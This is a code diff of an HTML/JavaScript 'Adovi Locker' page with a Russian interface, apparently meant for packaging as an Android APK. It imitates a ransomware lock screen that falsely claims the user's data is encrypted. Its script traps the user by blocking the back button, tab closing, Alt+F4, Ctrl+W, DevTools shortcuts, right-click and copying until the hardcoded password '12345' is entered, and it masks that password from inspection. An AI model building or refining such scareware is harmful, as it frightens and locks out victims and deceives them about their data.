@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>СИСТЕМА ЗАБЛОКИРОВАНА</title>
+    <title>Adovi Locker — locked</title>
     <style>
         * {
             margin: 0;
@@ -11,7 +11,9 @@
             box-sizing: border-box;
         }
         body {
-            background: #000;
+            background: #0a0a0a;
+            color: #00ff88;
+            font-family: 'Courier New', monospace;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -25,53 +27,47 @@
             width: 100vw;
             height: 100vh;
             z-index: 999999;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         .container {
-            background: linear-gradient(145deg, #0d0d0d, #1a0a0a);
-            padding: 50px 40px;
+            background: #111;
+            padding: 40px;
             border-radius: 30px;
             border: 3px solid #ff0040;
             text-align: center;
-            max-width: 520px;
+            max-width: 500px;
             width: 90%;
-            box-shadow: 0 0 100px rgba(255, 0, 64, 0.6);
-            position: relative;
-            z-index: 9999999;
+            box-shadow: 0 0 80px rgba(255, 0, 64, 0.6);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 80px rgba(255, 0, 64, 0.6); }
+            50% { box-shadow: 0 0 120px rgba(255, 0, 64, 0.9); }
+            100% { box-shadow: 0 0 80px rgba(255, 0, 64, 0.6); }
         }
         h1 {
-            font-size: 48px;
+            font-size: 46px;
             color: #ff0040;
-            text-shadow: 0 0 40px #ff0040, 0 0 80px #ff0040;
-            margin-bottom: 5px;
+            text-shadow: 0 0 30px #ff0040;
+            margin-bottom: 10px;
             letter-spacing: 5px;
-            font-weight: 900;
         }
         .subtitle {
             color: #ff6666;
-            font-size: 16px;
-            margin-bottom: 25px;
+            font-size: 14px;
+            margin-bottom: 20px;
             text-transform: uppercase;
             letter-spacing: 3px;
-            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
         }
         .icon {
-            font-size: 90px;
-            margin: 5px 0 15px;
-            filter: drop-shadow(0 0 30px #ff0040);
-        }
-        .description {
-            color: #ccc;
-            font-size: 16px;
-            margin: 15px 0;
-            line-height: 1.6;
+            font-size: 80px;
+            margin: 10px 0;
         }
         input {
             width: 100%;
-            padding: 20px;
+            padding: 18px;
             background: #1a1a1a;
             border: 2px solid #ff0040;
-            border-radius: 16px;
+            border-radius: 12px;
             color: #fff;
             font-size: 22px;
             text-align: center;
@@ -86,40 +82,38 @@
         }
         button {
             width: 100%;
-            padding: 20px;
+            padding: 18px;
             background: linear-gradient(45deg, #ff0040, #cc0033);
             border: none;
-            border-radius: 16px;
+            border-radius: 12px;
             color: #fff;
-            font-size: 22px;
-            font-weight: 900;
+            font-size: 20px;
+            font-weight: bold;
             cursor: pointer;
             transition: 0.3s;
             text-transform: uppercase;
-            letter-spacing: 3px;
+            letter-spacing: 2px;
             box-shadow: 0 0 30px rgba(255, 0, 64, 0.4);
         }
         button:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 60px rgba(255, 0, 64, 0.8);
+            box-shadow: 0 0 50px rgba(255, 0, 64, 0.7);
         }
         #status {
             margin-top: 20px;
-            font-size: 16px;
+            font-size: 14px;
             color: #ff0040;
             min-height: 24px;
-            font-weight: bold;
         }
         #errorMessage {
             color: #ff0040;
             font-size: 18px;
             margin-top: 15px;
             text-shadow: 0 0 15px #ff0040;
-            font-weight: bold;
         }
         .footer {
             margin-top: 25px;
-            font-size: 13px;
+            font-size: 12px;
             color: #555;
             letter-spacing: 2px;
         }
@@ -133,45 +127,15 @@
             z-index: 999998;
             pointer-events: none;
         }
-        /* Анимация пульсации */
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 60px rgba(255, 0, 64, 0.4); }
-            50% { box-shadow: 0 0 120px rgba(255, 0, 64, 0.9); }
-            100% { box-shadow: 0 0 60px rgba(255, 0, 64, 0.4); }
+        .shake {
+            animation: shake 0.4s ease-in-out;
         }
-        .container {
-            animation: pulseGlow 3s infinite;
-        }
-        /* Тряска */
         @keyframes shake {
             0% { transform: translateX(0); }
             25% { transform: translateX(-20px); }
             50% { transform: translateX(20px); }
             75% { transform: translateX(-10px); }
             100% { transform: translateX(10px); }
-        }
-        .shake {
-            animation: shake 0.4s ease-in-out;
-        }
-        /* Глитч-эффект */
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-3px, 3px); }
-            40% { transform: translate(3px, -3px); }
-            60% { transform: translate(-2px, -2px); }
-            80% { transform: translate(2px, 2px); }
-            100% { transform: translate(0); }
-        }
-        .glitch {
-            animation: glitch 0.2s infinite;
-        }
-        /* Мигающий текст */
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.2; }
-        }
-        .blink {
-            animation: blink 1s infinite;
         }
     </style>
 </head>
@@ -180,11 +144,11 @@
     <div class="container" id="lockerContainer">
         <div class="icon">☠️</div>
         <h1>ЗАБЛОКИРОВАНО</h1>
-        <div class="subtitle">⛔ ВЫХОД НЕВОЗМОЖЕН ⛔</div>
-        <div class="description">
-            Ваши данные зашифрованы. <br>
+        <div class="subtitle">⛔ ВЫХОД НЕВОЗМОЖЕН</div>
+        <p style="color: #aaa; margin-bottom: 15px;">
+            Ваши данные зашифрованы.<br>
             Введите пароль для разблокировки.
-        </div>
+        </p>
         <input type="password" id="passwordInput" placeholder="ПАРОЛЬ" autocomplete="off">
         <button onclick="unlock()">🔓 РАЗБЛОКИРОВАТЬ</button>
         <div id="status"></div>
@@ -193,78 +157,59 @@
     </div>
 
     <script>
-        // ========= НАСТРОЙКИ =========
+        // ===== НАСТРОЙКИ =====
         const PASSWORD = "12345";
         const REDIRECT_URL = "https://www.google.com";
 
-        // ========= БЛОКИРОВКА ВЫХОДА (НА 100%) =========
+        // ===== БЛОКИРОВКА ВЫХОДА (ДЛЯ APK) =====
+        // Блокировка кнопки "Назад" в APK
+        document.addEventListener('deviceready', function() {
+            document.addEventListener('backbutton', function(e) {
+                e.preventDefault();
+                document.getElementById('errorMessage').innerText = '⛔ Кнопка назад заблокирована!';
+                document.getElementById('lockerContainer').classList.add('shake');
+                setTimeout(() => document.getElementById('lockerContainer').classList.remove('shake'), 500);
+            });
+        });
 
-        // 1. Кнопка "Назад"
+        // Блокировка закрытия через браузер
         history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            history.go(1);
-        };
+        window.onpopstate = () => history.go(1);
 
-        // 2. Закрытие вкладки/браузера
-        window.onbeforeunload = function (e) {
+        window.onbeforeunload = (e) => {
             e.preventDefault();
             e.returnValue = "Выход невозможен! Введите пароль.";
             return "Выход невозможен! Введите пароль.";
         };
 
-        // 3. Блокировка клавиш: Alt+F4, Ctrl+W, F12, DevTools, Escape
-        document.addEventListener('keydown', function (e) {
+        // Блокировка клавиш
+        document.addEventListener('keydown', (e) => {
             const banned = ['F4', 'F12', 'Escape'];
             const combos = [
-                (e.altKey && e.key === 'F4'),
-                (e.ctrlKey && e.key === 'w'),
-                (e.ctrlKey && e.shiftKey && e.key === 'w'),
-                (e.ctrlKey && e.key === 'u'),
-                (e.ctrlKey && e.shiftKey && e.key === 'i')
+                e.altKey && e.key === 'F4',
+                e.ctrlKey && e.key === 'w',
+                e.ctrlKey && e.shiftKey && e.key === 'w',
+                e.ctrlKey && e.key === 'u',
+                e.ctrlKey && e.shiftKey && e.key === 'i'
             ];
             if (banned.includes(e.key) || combos.some(c => c)) {
                 e.preventDefault();
                 document.getElementById('errorMessage').innerText = '⛔ Попытка выхода заблокирована!';
-                const container = document.getElementById('lockerContainer');
-                container.classList.add('glitch');
-                setTimeout(() => container.classList.remove('glitch'), 500);
+                document.getElementById('lockerContainer').classList.add('shake');
+                setTimeout(() => document.getElementById('lockerContainer').classList.remove('shake'), 500);
             }
         });
 
-        // 4. Правая кнопка мыши
-        document.addEventListener('contextmenu', function (e) {
-            e.preventDefault();
-        });
+        // Блокировка правого клика
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('copy', e => e.preventDefault());
 
-        // 5. Выделение текста
-        document.addEventListener('selectstart', function (e) {
-            e.preventDefault();
-        });
-
-        // 6. Копирование
-        document.addEventListener('copy', function (e) {
-            e.preventDefault();
-        });
-
-        // 7. Свайп "Назад"
-        let touchStartX = 0;
-        document.addEventListener('touchstart', function (e) {
-            touchStartX = e.touches[0].clientX;
-        });
-        document.addEventListener('touchmove', function (e) {
-            const touchEndX = e.touches[0].clientX;
-            if (touchStartX - touchEndX > 50) {
-                e.preventDefault();
-                document.getElementById('errorMessage').innerText = '⛔ Жест назад заблокирован!';
-            }
-        });
-
-        // ========= ФУНКЦИЯ РАЗБЛОКИРОВКИ =========
+        // ===== РАЗБЛОКИРОВКА =====
         function unlock() {
             const input = document.getElementById('passwordInput').value;
             const status = document.getElementById('status');
             const error = document.getElementById('errorMessage');
-            const container = document.getElementById('lockerContainer');
 
             if (input === PASSWORD) {
                 status.innerHTML = '✅ ПАРОЛЬ ВЕРНЫЙ! РАЗБЛОКИРОВКА...';
@@ -275,26 +220,17 @@
                 document.querySelector('button').disabled = true;
                 document.querySelector('button').style.background = '#00ff88';
                 document.querySelector('button').innerText = '✅ РАЗБЛОКИРОВАНО';
-
-                // Снимаем блокировку выхода
                 window.onbeforeunload = null;
-
                 setTimeout(() => {
                     status.innerHTML = '✅ ПЕРЕХОД...';
-                    setTimeout(() => {
-                        window.location.href = REDIRECT_URL;
-                    }, 1500);
+                    setTimeout(() => window.location.href = REDIRECT_URL, 1500);
                 }, 1000);
-
             } else {
                 error.innerText = '❌ НЕВЕРНЫЙ ПАРОЛЬ!';
                 document.getElementById('passwordInput').value = '';
                 document.getElementById('passwordInput').focus();
-
-                // Тряска
-                container.classList.add('shake');
-                setTimeout(() => container.classList.remove('shake'), 500);
-
+                document.getElementById('lockerContainer').classList.add('shake');
+                setTimeout(() => document.getElementById('lockerContainer').classList.remove('shake'), 500);
                 status.innerHTML = '❌ Попробуйте снова.';
                 status.style.color = '#ff0040';
                 document.getElementById('passwordInput').style.borderColor = '#ff0040';
@@ -302,14 +238,13 @@
             }
         }
 
-        // ========= АВТОФОКУС И ЗАЩИТА ПАРОЛЯ =========
-        window.onload = function () {
+        window.onload = () => {
             document.getElementById('passwordInput').focus();
             Object.defineProperty(window, 'PASSWORD', {
-                get: function () { return 'Доступ запрещён'; },
-                set: function () { }
+                get: () => 'Доступ запрещён',
+                set: () => {}
             });
         };
     </script>
 </body>
-</html>
+            </html>
